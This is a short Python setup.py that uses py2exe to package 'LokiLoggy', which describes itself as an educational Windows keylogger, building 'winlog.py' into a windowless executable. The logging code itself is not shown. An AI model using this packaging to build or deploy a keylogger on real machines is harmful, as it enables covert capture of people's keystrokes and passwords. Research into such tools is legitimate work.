"""
Keylogger written in Python for education purposes.

Test Environment:
OS: Windows 7
Usage: python setup.py py2exe
"""

classifiers = """\
Development Status : Beta
Intended Audience : Researchers
License :
Programming Language : Python
Operating System : Microsoft Windows
"""

from distutils.core import setup, Extension
import py2exe

libs = ['user32']
doclines = __doc__.split('\n')

setup(name='LokiLoggy',
      version='0.01b',
      author='Jason Lim',
      author_email='',
      url='',
      download_url='',
      license='',
      platforms=['Win32'],
      description = doclines[1],
      classifiers = filter(None, classifiers.split('\n')),
      long_description = ' '.join(doclines[2:]),
      windows=['winlog.py']
      )
